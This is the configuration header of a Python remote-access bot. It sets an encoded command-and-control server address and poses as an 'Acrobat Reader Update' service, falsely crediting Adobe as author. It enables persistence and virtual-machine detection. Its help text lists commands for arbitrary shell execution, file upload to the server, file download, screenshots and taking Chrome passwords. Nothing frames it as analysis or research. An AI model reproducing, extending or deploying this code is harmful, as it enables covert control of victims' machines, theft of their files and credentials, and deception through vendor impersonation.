import base64,random
SERVER = random.choice(['687474703A2F2F3139322E3136382E312E32303A38303830','687474703A2F2F3139322E3136382E312E32303A38303830','687474703A2F2F3139322E3136382E312E32303A38303830','687474703A2F2F3139322E3136382E312E32303A38303830'])
SERVER = base64.b16decode(SERVER)
#SERVER = "http://192.168.1.20:8843" #debug
#################################
BOTVERSION = "1.0"
#################################
SERVICE_NAME = "Acrobat_Reader_Update" # startup
#################################
name='Acrobat Reader Update'
#################################
description='Acrobat Reader Update'
#################################
author="Adobe inc."
#################################
author_email="support@adobe.com"
#################################
HELLO_INTERVAL = 10
#################################
IDLE_TIME = 30
#################################
PAUSE_AT_START = 30
#################################
PERSIST = True
#################################
VM = 1  # 1=TRUE 0=FALSE
#################################

HELP = """
<any shell command>
Executes the command in a shell and return its output.

upload <local_file>
Uploads <local_file> to server.

download <url> <destination>
Downloads a file through HTTP(S).

zip <archive_name> <folder>
Creates a zip archive of the folder.

screenshot
Takes a screenshot.

ehidden
usage: ehidden <localfile>

unzip
usage: unzip <localfile> <pathname>

info
get pass chrome

bye
kill register

version
get version current

"""
#################################

